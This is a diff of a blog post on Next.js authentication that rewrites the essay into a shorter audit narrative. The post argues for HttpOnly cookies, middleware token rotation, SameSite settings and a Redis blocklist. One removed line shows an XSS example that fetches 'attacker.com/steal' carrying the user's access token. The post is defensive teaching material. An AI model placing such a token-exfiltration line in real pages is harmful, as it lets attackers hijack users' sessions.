@@ -5,48 +5,25 @@ summary: "Critical state belongs on the server. Examining HttpOnly cookies, serv
 slug: "server-centric-state"
 ---
 
-## The browser is not a vault
+A client asked me to audit their Next.js app. Revenue dashboard, user profiles, payment history — standard B2B SaaS. I opened DevTools, checked Application > Local Storage, and found the access token. Plain text. No prefix, no encryption.
 
-Every time you store a JWT in `localStorage`, you're making a decision: you're trusting the browser to protect a credential that can impersonate your user.
+I opened the Network tab, filtered by "script," and counted 16 third-party scripts running on the login page. Analytics, chat widgets, A/B testing, session recording. Any one of them could exfiltrate that token in one line. The app would have no way to detect it.
 
-The browser is a rendering surface. It executes arbitrary JavaScript from dozens of sources — your code, third-party analytics, ad scripts, npm packages with 47 transitive dependencies you've never audited. `localStorage` is readable by every line of JavaScript running on that page.
+The fix wasn't a better obfuscation library. It was removing the token from the browser entirely.
 
-XSS (Cross-Site Scripting) is not a theoretical attack vector. It's a category of vulnerability that has existed for 25 years and appears in production codebases constantly. An attacker who can inject JavaScript into your page can read `localStorage` in one line:
+The browser is not a vault. It's a rendering surface. It executes arbitrary JavaScript from dozens of sources — your code, third-party scripts, npm packages with 47 transitive dependencies. `localStorage` is readable by every line of JavaScript running on the page. XSS is not a theoretical attack. It's been a real vulnerability for 25 years.
 
-```javascript
-fetch("https://attacker.com/steal?token=" + localStorage.getItem("access_token"));
-```
+**HttpOnly cookies cannot be accessed by JavaScript.** The browser sends them with every request to your domain, and JS cannot read them. This is enforced by the browser's security model, not by your configuration.
 
-That's it. Your user's session is gone.
-
----
-
-## The pattern that actually works
-
-**HttpOnly cookies** cannot be accessed by JavaScript. Period. The browser sends them automatically with every request to your domain, and JavaScript cannot read them. This is not a configuration option — it's enforced by the browser's security model.
-
-The architecture looks like this:
+The architecture: browser sends request → server reads HttpOnly cookie → server validates session → server renders response. The browser never touches the token.
 
 <AuthSequenceDiagram />
 
-The browser never touches the token. It never stores it. It never reads it. The credential lives in an HttpOnly cookie, sent automatically, invisible to JavaScript.
+Access tokens expire by design. The question is what happens when they do. The naive approach: redirect to login. The correct approach: use a long-lived refresh token to issue a new access token silently, without interrupting the user.
 
----
-
-## Implementing token rotation in Next.js
-
-Access tokens expire. That's by design. The question is what happens when they do.
-
-The naive approach: redirect to login. The correct approach: use a long-lived refresh token to issue a new access token silently, without interrupting the user.
-
-In Next.js App Router, this lives in middleware:
+In Next.js App Router, this lives in middleware — it runs at the edge before any page renders:
 
 ```typescript
-// middleware.ts
-import { NextResponse } from "next/server";
-import type { NextRequest } from "next/server";
-import { refreshAccessToken } from "@/lib/auth";
-
 export async function middleware(request: NextRequest) {
   const accessToken = request.cookies.get("access_token")?.value;
   const refreshToken = request.cookies.get("refresh_token")?.value;
@@ -65,8 +42,6 @@ export async function middleware(request: NextRequest) {
     }
 
     const response = NextResponse.next();
-
-    // Set the cookie on the response — this reaches the browser.
     response.cookies.set("access_token", result.accessToken, {
       httpOnly: true,
       secure: process.env.NODE_ENV === "production",
@@ -75,17 +50,8 @@ export async function middleware(request: NextRequest) {
       path: "/",
     });
 
-    // Critical: mutate the request cookies so that Server Components
-    // reading cookies() during this same render cycle see the refreshed
-    // token. Without this, the response carries a valid cookie but the
-    // Server Component tree reads the original (expired) request headers
-    // and throws a 401 before the browser ever receives the new cookie.
     request.cookies.set("access_token", result.accessToken);
-    response.headers.set(
-      "x-middleware-request-cookie",
-      request.cookies.toString()
-    );
-
+    response.headers.set("x-middleware-request-cookie", request.cookies.toString());
     return response;
   }
 
@@ -93,54 +59,18 @@ export async function middleware(request: NextRequest) {
 }
 ```
 
-This runs at the edge before any page renders. The user never sees an expired token. They never get redirected to login when their access token silently rotates. The refresh token is itself an HttpOnly cookie.
+The user never sees an expired token. The refresh token is itself an HttpOnly cookie. When the access token expires, middleware silently refreshes it before the page renders.
 
----
+`SameSite` controls when cookies are sent with cross-site requests. `None` sends them everywhere — required for embeds, but your auth cookie follows the user to any site. `Lax` sends them with top-level navigations — default in modern browsers, protects against most CSRF. `Strict` only sends them for same-site requests — maximum protection, clicking a link from email won't include the cookie. For internal clinic dashboards and API-driven apps, `Strict` is the right choice.
 
-## Why sameSite matters
+HttpOnly cookies solve the client-side exposure problem. They don't solve server-side session management. If you validate a JWT on every request, you have stateless authentication — the most scalable approach for serverless environments. The tradeoff: you can't instantly invalidate a JWT before it expires. For most apps, this is acceptable. For high-security contexts, pair it with a Redis blocklist.
 
-There are three values for the `SameSite` cookie attribute: `None`, `Lax`, and `Strict`.
+In Soff.ia's dashboard — where clinic owners control patient data — we use 15-minute access tokens with a Redis blocklist checked on sensitive writes. One Redis lookup per mutation. Instant session invalidation as the tradeoff.
 
-- `None`: Cookie sent with all cross-site requests. Required for embedded iframes. Also means your auth cookie follows the user to any site.
-- `Lax`: Cookie sent with top-level navigations and same-site requests. The default in modern browsers. Protects against most CSRF.
-- `Strict`: Cookie only sent for same-site requests. Maximum protection. Clicking a link from an email won't include the cookie.
+The shift in mental model: **the server is the source of truth. The browser is a view.** A user's preferences, their active session, their role permissions — none of these should live in a JavaScript variable. They should live in a database, read on the server, and arrive at the browser as rendered HTML.
 
-For internal clinic dashboards and API-driven applications, `Strict` is the right choice. The slight UX friction of requiring a fresh login after following an external link is worth the complete elimination of CSRF.
+In Next.js with App Router, most state that developers reflexively put in `useState` can live in the URL (via `searchParams`) or be fetched on the server. This is not a performance tradeoff. For authenticated applications, server-side rendering of user-specific data is faster than loading a skeleton, fetching client-side, and filling in the content.
 
----
-
-## The session store question
-
-HttpOnly cookies solve the client-side exposure problem. They don't solve the server-side session management problem.
-
-If you validate a JWT on every request, you have stateless authentication. The server doesn't need to remember anything — the JWT carries the claims. This is the most scalable approach and the correct one for serverless environments like Vercel.
-
-The tradeoff: you can't instantly invalidate a JWT before it expires. If a user logs out, the JWT stays valid for its remaining lifetime (typically 15 minutes). For most applications, this is acceptable. For high-security contexts, you pair it with a token blocklist in Redis.
-
-In Soff.ia's dashboard — where clinic owners control patient data — we use 15-minute access tokens with a Redis blocklist that's checked on sensitive write operations. The performance cost is one Redis lookup per mutation. The security gain is instant session invalidation.
-
----
-
-## What the browser does instead
-
-When state doesn't live in `localStorage`, it needs to live somewhere. The answer is: in the URL, in server-rendered components, or in React Server Component props.
-
-In Next.js 15 with the App Router, most state that developers reflexively put in `useState` can live in the URL (via `searchParams`) or be fetched on the server (via `async` Server Components that read from the database on every request).
-
-The shift in mental model: **the server is the source of truth. The browser is a view.**
-
-A user's preferences, their active session, their role permissions — none of these should live in a JavaScript variable. They should live in a database, be read on the server, and arrive at the browser as rendered HTML.
-
-This is not a performance tradeoff. For authenticated applications, server-side rendering of user-specific data is faster than loading a skeleton, making a client-side fetch, and filling in the content. The first byte contains everything the user needs to see.
-
----
-
-## The summary, without euphemism
-
-Store tokens in HttpOnly cookies. Never in `localStorage`. Never in `sessionStorage`. Never in a JavaScript variable that outlives a render cycle.
-
-Rotate access tokens silently in middleware. Use short expiry (15 minutes). Pair refresh tokens with a server-side blocklist if your threat model requires instant invalidation.
-
-Use `sameSite: strict` for internal tools. Use `sameSite: lax` if you need external redirects to work.
+Store tokens in HttpOnly cookies. Never in `localStorage`, `sessionStorage`, or a JavaScript variable that outlives a render cycle. Rotate tokens silently in middleware. Use short expiry. Pair with a server-side blocklist if you need instant invalidation.
 
 The browser renders. The server authenticates. These responsibilities don't overlap.
